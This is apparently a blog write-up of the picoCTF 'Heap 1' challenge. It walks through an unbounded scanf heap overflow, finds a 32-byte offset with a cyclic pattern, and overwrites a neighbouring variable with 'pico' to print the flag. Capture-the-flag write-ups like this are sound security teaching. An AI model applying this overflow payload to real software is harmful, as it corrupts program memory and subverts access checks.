---
title: "Heap 1"
date: "2025-07-16"
tags: ["picoCTF", "heap", "buffer overflow"]
---

As we can see, the challenge shows us two memory addresses with their values.

```c
./chall              

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5555555596b0  ->   pico
+-------------+----------------+
[*]   0x5555555596d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 
```

It lets us write into the buffer. Let's look at the code to check whether some function is being used in an unsafe way:

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

Sure enough, the `scanf` does not bound the size of the input. We can use that to overflow the buffer.

If we keep digging through the code, we can see the condition for the flag to be printed:

```c
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flag for you :(\n");
        fflush(stdout);
    }
}
```

If we pick the "Print Flag" option and the `safe_var` variable equals `"pico"`, we get the flag.

The `safe_var` variable is, by logic, the one holding `bico` as its value.

Let's build a cyclic pattern to find the offset from the buffer to the `safe_var` variable:

```c
Enter your choice: 2
Data for buffer: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

1. Print Heap:
2. Write to buffer:
3. Print safe_var:
4. Print Flag:
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5555555596b0  ->   aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa1
aaraaasaaataaauaaavaaawaaaxaaayaaa
+-------------+----------------+
[*]   0x5555555596d0  ->   iaaajaaakaaalaaamaaanaaaoaaapaaa1
aaraaasaaataaauaaavaaawaaaxaaayaaa
+-------------+----------------+
```

Using the cyclic pattern:

```c
pwn cyclic -l iaaa
32
```

We have an offset of 32. Let's write 32 characters and then `"pico"`:

```bash
python2 -c 'print ("A" * 32 + "pico")'
```

Output:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
```

We run it:

```c
Welcome to heap1!
...
Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

Enter your choice: 4

YOU WIN
picoCTF{SECRETO}
```

We have the flag!
